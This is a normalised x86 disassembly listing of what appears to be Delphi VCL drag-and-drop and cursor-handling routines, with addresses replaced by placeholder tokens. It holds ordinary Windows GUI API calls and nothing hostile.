mov edx eax
mov eax [ rw-data ]
call sub_41a4c0
mov edx edi
mov eax [ rw-data ]
call sub_41a474
jmp r-xdata
sub_447cc4
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov [ ebp - 0x4 ] ecx
xor ecx ecx
test eax eax
je r-xdata
mov eax ecx
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov ecx [ ebp + 0x8 ]
mov ebx [ ecx ]
mov [ ebp - 0x18 ] ebx
mov ebx [ ecx + 0x4 ]
mov [ ebp - 0x14 ] ebx
mov ecx [ ebp + 0xc ]
mov [ ebp - 0xc ] ecx
mov ecx [ ebp - 0x4 ]
mov [ ebp - 0x10 ] ecx
cmp [ rw-data ] 0x2
sete cl
mov [ ebp - 0x8 ] cl
lea ecx [ ebp - 0x18 ]
push ecx
and edx 0x7f
push edx
push 0xb02f
push eax
call SendMessageA
mov ecx eax
sub_447d1c
push ebx
push esi
push ecx
mov esi eax
xor ebx ebx
test esi esi
je r-xdata
mov eax ebx
pop edx
pop esi
pop ebx
retn
push esp
push esi
call GetWindowThreadProcessId
test eax eax
je r-xdata
call GetCurrentProcessId
cmp eax [ esp ]
jne r-xdata
mov eax [ rw-data ]
call sub_404464
push eax
call GlobalFindAtomA
cmp ax [ rw-data ]
jne r-xdata
mov eax esi
call sub_446e10
test eax eax
setne bl
movzx eax [ rw-data ]
push eax
push esi
call GetPropA
test eax eax
setne bl
jmp r-xdata
sub_447d7c
push ebx
push [ eax + 0x4 ]
push [ eax ]
call WindowFromPoint
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_447d1c
test al al
jne r-xdata
push ebx
call GetParent
mov ebx eax
test ebx ebx
jne r-xdata
sub_447da8
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
test cl cl
jne r-xdata
mov eax ebx
mov edx [ ebp + 0x8 ]
call sub_447b08
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
call sub_447d7c
mov [ esi ] eax
push 0x0
push ebx
mov eax [ esi ]
mov ecx [ rw-data ]
mov dl 0x5
call sub_447cc4
mov ebx eax
jmp r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn 0x4
mov eax ebx
call sub_4507d8
mov [ esi ] eax
sub_447df8
push ebx
push esi
mov ebx eax
xor eax eax
mov edx [ rw-data ]
mov esi [ edx + 0x4 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
push esi
mov eax [ rw-data ]
add eax 0xc
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x8 ]
mov ecx [ rw-data ]
mov edx ebx
call sub_447cc4
cmp eax 0x1
sbb eax eax
inc eax
sub_447e34
push ebx
push esi
push edi
xor edi edi
mov eax [ rw-data ]
mov esi [ eax + 0x4 ]
test esi esi
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x1a7 ] 0x0
je r-xdata
cmp [ esi + 0x178 ] 0x0
je r-xdata
mov eax esi
call sub_44f23c
test eax eax
je r-xdata
mov eax esi
call sub_44f23c
dec eax
jne r-xdata
mov eax [ rw-data ]
add eax 0xc
xor edx edx
call sub_448864
mov ebx eax
jmp r-xdata
xor edx edx
mov eax [ esi + 0x178 ]
call sub_41a5d0
mov edx [ rw-data ]
cmp eax [ edx + 0x38 ]
je r-xdata
test ebx ebx
je r-xdata
cmp esi ebx
jne r-xdata
mov edx ebx
mov eax [ esi + 0x178 ]
call sub_41a62c
cmp eax 0xffffffff
je r-xdata
mov ebx [ ebx + 0x30 ]
mov edx eax
mov eax esi
call sub_44f250
mov edi eax
jmp r-xdata
sub_447ec8
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi eax
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
mov cl [ eax + 0x9b ]
lea edx [ esp + 0x4 ]
mov eax edi
call sub_447da8
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
sub eax [ edi ]
cdq
xor eax edx
sub eax edx
cmp eax [ rw-data ]
jge r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x9b ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
sub eax [ edi + 0x4 ]
cdq
xor eax edx
sub eax edx
cmp eax [ rw-data ]
jl r-xdata
cmp [ rw-data ] 0x0
setne [ esp + 0x4 ]
mov [ rw-data ] 0x2
mov [ rw-data ] 0x1
mov [ esp + 0x4 ] 0x0
jmp r-xdata
mov eax [ rw-data ]
push eax
call GetDesktopWindow
mov edx eax
mov ecx [ rw-data ]
mov eax [ rw-data ]
call sub_4522fc
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
mov edx [ edi ]
mov [ eax + 0xc ] edx
mov edx [ edi + 0x4 ]
mov [ eax + 0x10 ] edx
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov al 0x1
call sub_447df8
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x4 ]
je r-xdata
mov eax [ edi + 0x4 ]
push eax
mov al 0x2
call sub_447df8
mov edx eax
mov ecx [ edi ]
mov eax [ rw-data ]
mov esi [ eax ]
call [ esi + 0x4 ]
mov esi eax
cmp [ rw-data ] 0x0
je r-xdata
lea ecx [ esp + 0x8 ]
mov edx edi
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
call sub_449afc
mov eax [ rw-data ]
mov edx [ esp + 0x8 ]
mov [ eax + 0x14 ] edx
mov edx [ esp + 0xc ]
mov [ eax + 0x18 ] edx
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov eax [ rw-data ]
mov edx [ esp ]
mov [ eax + 0x8 ] edx
mov eax [ rw-data ]
mov edx [ edi ]
mov [ eax + 0xc ] edx
mov edx [ edi + 0x4 ]
mov [ eax + 0x10 ] edx
xor eax eax
call sub_447df8
cmp [ rw-data ] 0x0
je r-xdata
movsx edx si
mov eax [ rw-data ]
mov eax [ eax ]
call sub_468bcc
push eax
call SetCursor
cmp [ rw-data ] 0x2
jne r-xdata
test ebx ebx
je r-xdata
test ebx ebx
jne r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_4522b8
mov eax [ rw-data ]
cmp [ eax + 0x6a ] 0x0
jne r-xdata
test [ ebx + 0x51 ] 0x20
je r-xdata
call sub_447e34
mov ebx eax
mov eax [ rw-data ]
mov [ eax + 0x58 ] ebx
test ebx ebx
jne r-xdata
mov edx [ edi + 0x4 ]
push edx
mov ecx [ edi ]
mov eax [ rw-data ]
mov edx [ eax + 0x38 ]
xchg edx eax
mov si 0xffe7
call sub_403450
jmp r-xdata
mov ecx [ edi + 0x4 ]
mov edx [ edi ]
mov eax [ rw-data ]
call sub_4523e4
jmp r-xdata
mov eax [ edi + 0x4 ]
push eax
call GetDesktopWindow
mov edx eax
mov ecx [ edi ]
mov eax [ rw-data ]
call sub_4522fc
jmp r-xdata
mov eax [ rw-data ]
call sub_452458
movsx edx si
mov eax [ rw-data ]
mov eax [ eax ]
call sub_468bcc
push eax
call SetCursor
lea ecx [ esp + 0x8 ]
mov edx edi
mov eax ebx
call sub_449afc
lea edx [ esp + 0x8 ]
mov eax ebx
mov si 0xffd8
call sub_403450
mov edx [ rw-data ]
mov [ edx + 0x54 ] al
mov eax [ rw-data ]
lea edx [ eax + 0x14 ]
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov si 0xffd8
call sub_403450
mov edx [ rw-data ]
mov [ edx + 0x54 ] al
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov ebx [ rw-data ]
lea edx [ ebx + 0x5c ]
lea eax [ ebx + 0x44 ]
mov ecx 0x10
call sub_408160
test al al
jne r-xdata
cmp [ esp + 0x4 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x30 ]
mov eax [ rw-data ]
lea esi [ eax + 0x44 ]
lea edi [ eax + 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x34 ]
sub_448198
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov ebx edx
mov esi eax
mov [ rw-data ] esi
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x4 ] edx
push rw-data
call GetCursorPos
mov eax [ rw-data ]
mov edx [ rw-data ]
mov [ eax + 0xc ] edx
mov edx [ rw-data ]
mov [ eax + 0x10 ] edx
call GetCursor
mov [ rw-data ] eax
mov eax [ rw-data ]
call sub_4473c4
mov [ rw-data ] eax
mov [ rw-data ] edi
mov eax esi
mov edx [ r-xdata ]
call sub_4033e0
test al al
je r-xdata
test bl bl
je r-xdata
mov edx esi
lea eax [ edx + 0x44 ]
mov edi [ eax + 0x8 ]
mov ecx [ eax ]
sub edi ecx
test edi edi
jle r-xdata
mov [ rw-data ] 0x0
mov [ rw-data ] 0x1
jmp r-xdata
xor ecx ecx
mov [ edx + 0x20 ] ecx
mov [ edx + 0x24 ] ecx
mov edi [ edx + 0xc ]
sub edi ecx
mov [ esp ] edi
fild [ esp ]
mov ecx [ eax + 0x8 ]
sub ecx [ eax ]
mov [ esp + 0x4 ] ecx
fild [ esp + 0x4 ]
fdivp st1
fstp [ edx + 0x20 ]
fwait
jmp r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403224
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call GetDesktopWindow
mov edx eax
mov ecx [ rw-data ]
mov eax [ rw-data ]
call sub_4522fc
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ esi + 0x28 ] eax
mov [ esi + 0x2c ] eax
mov ecx esi
mov edi [ ecx + 0x10 ]
sub edi edx
mov [ esp ] edi
fild [ esp ]
mov edx [ eax + 0xc ]
sub edx [ eax + 0x4 ]
mov [ esp + 0x4 ] edx
fild [ esp + 0x4 ]
fdivp st1
fstp [ ecx + 0x28 ]
fwait
jmp r-xdata
mov ecx [ eax + 0xc ]
mov edx [ eax + 0x4 ]
sub ecx edx
test ecx ecx
jle r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax rw-data
call sub_447ec8
mov [ rw-data ] 0x0
jmp r-xdata
mov [ rw-data ] 0x2
mov eax esi
mov edx [ eax ]
call [ edx + 0x30 ]
jmp r-xdata
test bl bl
je r-xdata
sub_448308
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov edi eax
mov [ rw-data ] edi
xor edx edx
push ebp
push sub_4484ad
push [ fs : edx ]
mov [ fs : edx ] esp
xor eax eax
mov [ ebp - 0x8 ] eax
mov [ rw-data ] 0x0
cmp [ edi + 0x9b ] 0x0
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
mov si 0xffe3
call sub_403450
cmp [ rw-data ] 0x0
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
mov si 0xffdc
call sub_403450
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov esi [ eax + 0x38 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4033e0
test al al
je r-xdata
mov ecx edi
mov dl 0x1
mov eax [ r-xdata ]
call sub_4476cc
mov [ ebp - 0x8 ] eax
mov [ rw-data ] 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_448198
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov ecx edi
mov dl 0x1
mov eax [ r-xdata ]
call sub_4475b4
mov [ ebp - 0x8 ] eax
mov [ rw-data ] 0x1
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov esi [ eax + 0x38 ]
cmp [ esi + 0x30 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
add eax 0x44
push eax
mov eax esi
call sub_4507d8
push eax
call GetWindowRect
jmp r-xdata
lea ecx [ ebp - 0x20 ]
xor edx edx
xor eax eax
call sub_419174
lea edx [ ebp - 0x20 ]
lea ecx [ ebp - 0x18 ]
mov eax esi
call sub_449ad0
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x18 ]
mov [ eax + 0x44 ] edx
mov edx [ ebp - 0x14 ]
mov [ eax + 0x48 ] edx
mov eax esi
mov edx [ r-xdata ]
call sub_4033e0
test al al
jne r-xdata
mov eax [ ebp - 0x8 ]
lea esi [ eax + 0x44 ]
lea edi [ eax + 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea eax [ ebp - 0x10 ]
push eax
call GetCursorPos
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
mov [ eax + 0x44 ] edx
mov edx [ ebp - 0xc ]
mov [ eax + 0x48 ] edx
jmp r-xdata
mov esi [ ebp - 0x8 ]
mov edx [ esi + 0x48 ]
mov eax [ ebp - 0x8 ]
mov edi [ eax + 0x38 ]
add edx [ edi + 0x4c ]
mov eax [ esi + 0x44 ]
add eax [ edi + 0x48 ]
lea ecx [ ebp - 0x18 ]
call sub_419174
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x18 ]
mov [ eax + 0x4c ] edx
mov edx [ ebp - 0x14 ]
mov [ eax + 0x50 ] edx
sub_4484cc
push ebp
mov ebp esp
push ebx
push esi
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x0
setne bl
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x0
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
cmp [ rw-data ] 0x2
jne r-xdata
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
jne r-xdata
mov bl 0x1
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax + 0xa0 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0xa0 ]
test eax eax
je r-xdata
mov edx [ rw-data ]
mov edx [ edx + 0x4 ]
mov ecx [ rw-data ]
mov si 0xffbe
call sub_403450
mov ebx eax
sub_448540
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x1 ] al
xor ebx ebx
mov [ ebp - 0x2 ] 0x0
cmp [ rw-data ] 0x0
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
cmp [ eax + 0x30 ] 0x0
jne r-xdata
xor edx edx
push ebp
push sub_44880c
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
mov [ rw-data ] eax
xor edx edx
push ebp
push sub_44879a
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
mov [ eax + 0x30 ] 0x1
mov eax [ rw-data ]
mov dl [ ebp - 0x1 ]
mov [ eax + 0x1c ] dl
mov edx [ rw-data ]
mov eax [ rw-data ]
call sub_44740c
cmp [ rw-data ] 0x2
jne r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_403404
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
cmp [ ebx + 0x4 ] 0x0
sete al
mov [ ebx + 0x6c ] al
mov eax [ rw-data ]
mov edx [ eax + 0xc ]
mov [ ebp - 0xa ] edx
mov edx [ eax + 0x10 ]
mov [ ebp - 0x6 ] edx
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov edx [ r-xdata ]
call sub_4033e0
test al al
je r-xdata
xor eax eax
jmp r-xdata
cmp [ rw-data ] 0x2
jne r-xdata
mov eax [ rw-data ]
mov edx [ eax + 0x14 ]
mov [ ebp - 0xa ] edx
mov edx [ eax + 0x18 ]
mov [ ebp - 0x6 ] edx
jmp r-xdata
mov [ ebp - 0x2 ] al
cmp [ rw-data ] 0x2
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
push ebp
call sub_4484cc
pop ecx
test al al
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ ebp - 0x2 ] 0x0
je r-xdata
mov al 0x1
call sub_447df8
test al al
je r-xdata
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
call SetCursor
mov eax [ rw-data ]
call sub_452458
jmp r-xdata
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
cmp [ ebx + 0x6c ] 0x0
je r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4487a1
mov eax [ rw-data ]
call sub_403254
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x38 ]
call sub_461dc8
test eax eax
je r-xdata
xor eax eax
mov [ rw-data ] eax
retn
mov eax [ rw-data ]
mov [ eax + 0x30 ] 0x0
mov eax [ ebp - 0x6 ]
push eax
mov al [ ebp - 0x2 ]
push eax
mov eax [ rw-data ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0xa ]
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx ]
mov al 0x3
cmp [ ebp - 0x2 ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
xor ecx ecx
mov edx 0xb03a
mov eax [ rw-data ]
call sub_44b16c
jmp r-xdata
mov edx [ eax + 0x220 ]
cmp edx [ ebx + 0x38 ]
jne r-xdata
mov edx [ rw-data ]
mov edx [ edx + 0x4 ]
push edx
mov edx [ rw-data ]
add edx 0xc
push edx
mov edx [ rw-data ]
mov edx [ edx + 0x8 ]
mov ecx [ rw-data ]
xchg edx eax
call sub_447cc4
mov al 0x4
mov edx [ rw-data ]
xor ecx ecx
mov [ edx + 0xc ] ecx
mov edx [ rw-data ]
xor ecx ecx
mov [ edx + 0x10 ] ecx
xor edx edx
mov [ ebp - 0xa ] edx
xor edx edx
mov [ ebp - 0x6 ] edx
xor edx edx
call sub_465b2c
sub_4487a1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov [ rw-data ] 0x0
retn
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_4033e0
test al al
jne r-xdata
mov eax [ rw-data ]
call sub_403254
mov eax [ rw-data ]
mov edx [ rw-data ]
call sub_4033e0
test al al
jne r-xdata
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_4033e0
test al al
je r-xdata
sub_448830
push ebx
push esi
push [ eax + 0x4 ]
push [ eax ]
call WindowFromPoint
mov ebx eax
xor esi esi
test ebx ebx
je r-xdata
mov eax esi
pop esi
pop ebx
retn
mov eax ebx
call sub_446e44
mov esi eax
test esi esi
jne r-xdata
push ebx
call GetParent
mov ebx eax
test ebx ebx
jne r-xdata
sub_448864
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx edx
mov edi eax
xor esi esi
mov eax edi
call sub_448830
mov ebp eax
test ebp ebp
je r-xdata
mov eax esi
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov esi ebp
push 0x0
lea ecx [ esp + 0x4 ]
mov edx edi
mov eax ebp
call sub_449afc
lea edx [ esp + 0x4 ]
mov ecx ebx
mov eax ebp
call sub_44e08c
test eax eax
je r-xdata
mov esi eax
sub_4488ac
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx ] 0x0
jne r-xdata
mov eax [ ebx ]
mov edx esi
call sub_41a474
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403224
mov [ ebx ] eax
sub_4488d4
push ebx
mov ebx eax
mov eax [ ebx ]
call sub_41a714
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx ]
call sub_403254
xor eax eax
mov [ ebx ] eax
sub_4488f4
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
push esp
push ebx
call GetWindowOrgEx
push 0x0
mov eax [ esp + 0x8 ]
sub eax edi
push eax
mov eax [ esp + 0x8 ]
sub eax esi
push eax
push ebx
call SetWindowOrgEx
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_448924
push ebp
mov ebp esp
add esp 0xfffffff0
mov eax [ rw-data ]
call sub_41a978
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4489d4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_41a9dc
retn
inc eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0xc ]
jne r-xdata
xor eax eax
push ebp
push sub_4489ad
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
call sub_448b60
call sub_403a8c
call sub_403a8c
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_41a5d0
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
call sub_424410
test al al
je r-xdata
mov esp ebp
pop ebp
retn
sub_4489e0
push ebp
mov ebp esp
add esp 0xfffffff4
mov eax [ rw-data ]
call sub_41a978
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_448a7e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
dec eax
cmp eax 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_448a85
mov eax [ rw-data ]
call sub_41a9dc
retn
mov [ ebp - 0x4 ] eax
dec [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0xffffffff
jne r-xdata
xor eax eax
push ebp
push sub_448a56
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_448b60
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_42446c
retn
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_41a5d0
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
call sub_424410
test al al
je r-xdata
sub_448a8c
push ebx
push esi
call sub_4035e0
mov ebx edx
mov esi eax
mov eax esi
call sub_448b60
mov edx ebx
and dl 0xfc
mov eax esi
call sub_423ea8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035c8
sub_448ab8
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x58 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5c ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_424614
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x5c ]
mov eax [ ebp - 0x4 ]
call sub_424618
mov eax [ ebp - 0x4 ]
call sub_448bac
mov eax [ rw-data ]
call sub_41a978
mov ebx eax
xor eax eax
push ebp
push sub_448b3d
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x8 ] 0x4
jl r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
lea edx [ eax + 0x60 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x5c ] eax
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_41a474
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_41a9dc
retn
call sub_448924
sub_448b60
push ebx
mov ebx eax
cmp [ ebx + 0x5c ] 0x0
je r-xdata
pop ebx
retn
xor edx edx
mov eax ebx
call sub_424618
mov edx ebx
mov eax [ rw-data ]
call sub_41a98c
mov eax [ ebx + 0x5c ]
push eax
mov eax [ ebx + 0x60 ]
push eax
call ReleaseDC
xor eax eax
mov [ ebx + 0x5c ] eax
sub_448bac
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x58 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_44a5fc
test al al
je r-xdata
and [ ebx + 0x54 ] 0xffffff7f
or [ ebx + 0x54 ] 0x80
jmp r-xdata
sub_448bd8
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403224
mov [ edi + 0x4 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403578
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4035d0
pop [ fs : 0x0 ]
add esp 0xc
sub_448c14
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4033e0
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_41acac
pop esi
pop ebx
retn
mov eax ebx
mov edx [ esi + 0x10 ]
mov [ eax + 0x10 ] edx
mov edx [ esi + 0x8 ]
mov [ eax + 0x8 ] edx
mov edx [ esi + 0x14 ]
mov [ eax + 0x14 ] edx
mov edx [ esi + 0xc ]
mov [ eax + 0xc ] edx
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
pop ebx
retn
sub_448c5c
push esi
mov esi eax
sub edx 0x1
jb r-xdata
cmp ecx [ esi + 0x8 ]
je r-xdata
je r-xdata
pop esi
retn
mov [ esi + 0x8 ] ecx
test ecx ecx
jbe r-xdata
cmp ecx [ esi + 0xc ]
je r-xdata
dec edx
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
retn
cmp ecx [ esi + 0x10 ]
jae r-xdata
mov [ esi + 0xc ] ecx
test ecx ecx
jbe r-xdata
cmp ecx [ esi + 0x10 ]
je r-xdata
dec edx
je r-xdata
mov [ esi + 0x10 ] ecx
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
retn
cmp ecx [ esi + 0x14 ]
jae r-xdata
mov [ esi + 0x10 ] ecx
mov eax [ esi + 0x8 ]
test eax eax
jbe r-xdata
cmp ecx [ esi + 0x14 ]
je r-xdata
jmp r-xdata
mov [ esi + 0x14 ] ecx
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
retn
cmp eax ecx
jae r-xdata
mov [ esi + 0x14 ] ecx
mov eax [ esi + 0xc ]
test eax eax
jbe r-xdata
mov [ esi + 0x8 ] ecx
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
cmp eax ecx
jae r-xdata
mov [ esi + 0xc ] ecx
sub_448d18
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x1c ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_448de5
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x1 ] 0x1
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033e0
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_448dec
lea eax [ ebp - 0x1c ]
call sub_403fa4
lea eax [ ebp - 0x8 ]
call sub_403fa4
retn
mov edx edi
mov eax [ ebx + 0x10 ]
mov si 0xffee
call sub_403450
test al al
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x7c ] 0x0
je r-xdata
mov eax [ ebx + 0x10 ]
cmp [ eax + 0x84 ] 0x0
je r-xdata
cmp [ edi ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
mov eax [ edi ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0xb
lea edx [ ebp - 0x1c ]
mov eax [ ebx + 0x10 ]
mov ax [ eax + 0x84 ]
call sub_4599dc
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov ecx 0x1
mov eax r-xdata
call sub_4092bc
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_403ff8
sub_448e08
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_448e6f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_4565f0
test al al
je r-xdata
xor eax eax
jmp r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x18 ]
call sub_449fb8
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403404
mov edx [ eax + 0x64 ]
pop eax
call sub_4043b0
je r-xdata
